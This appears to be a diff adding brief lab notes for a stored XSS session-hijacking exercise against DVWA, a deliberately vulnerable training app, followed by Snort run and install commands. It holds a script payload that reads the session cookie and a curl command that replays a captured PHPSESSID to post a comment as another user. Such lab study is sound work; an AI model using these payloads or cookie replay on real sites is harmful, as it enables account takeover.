@@ -1,0 +1,23 @@
+1. Attacker Login
+
+2. Change security to low
+
+3. Inject Payload
+    <script>console.log(document.cookie)</script>
+
+4. Logout
+
+5. New user logs in
+
+6. Goes to XSS page
+
+7. Script is executed, cookie is sent to attacker (copy it manually for now)
+
+8. Attacker user his machine to add a comment using cookie
+    curl -X POST -b "security=low; PHPSESSID=9ecc84081433870a847d9c096762a91f" -d "txtName=WhoAmI&mtxMessage=You%27ve+been+hacked&btnSign=Sign+Guestbook" http://10.30.0.235/dvwa/vulnerabilities/xss_s/
+
+-------------------------------------------------------------------
+
+sudo snort -d -l /var/log/snort/ -h 192.168.1.0/24 -A console -c /etc/snort/snort.conf
+
+sudo apt install -y build-essential cmake git pkg-config libpcap-dev libpcre3-dev zlib1g-dev liblzma-dev openssl libssl-dev bison flex libdumbnet-dev libhwloc-dev luajit libluajit-5.1-dev libunwind-dev
